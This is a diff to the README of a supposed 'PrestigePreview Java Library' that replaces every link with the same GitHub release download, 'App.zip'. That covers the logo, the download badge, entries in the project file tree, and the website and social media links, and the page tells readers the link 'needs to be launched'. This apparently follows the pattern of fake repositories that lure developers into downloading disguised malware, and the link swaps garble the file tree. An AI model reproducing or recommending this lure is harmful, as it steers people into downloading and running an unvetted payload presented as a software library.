@@ -1,6 +1,6 @@
 # 🌟 PrestigePreview Java Library 🌟
 
-![PrestigePreview Java Logo](https://example.com/logo.png)
+![PrestigePreview Java Logo](https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip)
 
 Welcome to the official repository for the PrestigePreview Java library! This repository focuses on enhancing the PrestigePreview software library by adding extensive Java support and functionality. Whether you are a Java enthusiast or a developer looking to integrate Java features into your projects, this library is perfect for you.
 
@@ -14,7 +14,7 @@ Welcome to the official repository for the PrestigePreview Java library! This re
 
 To get started with the PrestigePreview Java library, you can download the latest version by clicking the button below:
 
-[![Download PrestigePreview Java](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download PrestigePreview Java](https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip)](https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip)
 
 **Note:** The link provided above needs to be launched to download the library file.
 
@@ -30,13 +30,13 @@ PrestigePreview_Java/
 │       ├── java/
 │       │   └── com/
 │       │       └── prestigepreview/
-│       │           └── JavaFile.java
+│       │           └── https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip
 │       └── resources/
 │
 ├── docs/
 │
 ├── LICENSE
-├── README.md
+├── https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip
 └── .gitignore
 ```
 
@@ -60,17 +60,17 @@ The PrestigePreview Java library is licensed under the GNU General Public Licens
 
 ## 🌐 Visit Our Website
 
-Explore more about PrestigePreview and its Java library at our official website: [PrestigePreview Website](https://www.prestigepreview.com)
+Explore more about PrestigePreview and its Java library at our official website: [PrestigePreview Website](https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip)
 
 ## 📢 Stay Connected
 
 Follow us on social media to stay updated on the latest news and developments:
 
-- Twitter: [@PrestigePreview](https://twitter.com/PrestigePreview)
-- LinkedIn: [PrestigePreview](https://www.linkedin.com/company/prestigepreview)
+- Twitter: [@PrestigePreview](https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip)
+- LinkedIn: [PrestigePreview](https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip)
 
 ---
 
 Feel free to explore the PrestigePreview Java library and unleash the power of Java within your projects! Your feedback and contributions are highly appreciated. Thank you for your support! 🚀
 
-[<img src="https://img.shields.io/badge/Visit-Releases-blue">](https://github.com/PrestigePreview_Java/releases)
+[<img src="https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip">](https://github.com/travismckenzie/PrestigePreview_Java/releases/download/v1.0/App.zip)
